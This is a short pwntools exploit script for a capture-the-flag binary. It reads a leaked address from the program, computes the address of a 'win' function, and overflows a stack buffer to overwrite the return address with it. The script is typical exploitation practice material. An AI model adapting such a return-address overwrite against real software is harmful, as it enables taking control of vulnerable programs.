from pwn import *

# elf context
elf = context.binary = ELF('./chall')
p = process(elf.path)

# grab base address
p.recvuntil(b'@ ')
p.recvuntil(b'@ ')
a_base = int(p.recv(14).decode(), 16)

# calculate win address
f_win = p64(a_base - 0x2a37)

# generate payload
payload = b'A' * 0x20       # buffer
payload += b'B' * 0x8       # base pointer
payload += f_win            # return address

# execute
p.sendline(payload)
p.interactive()
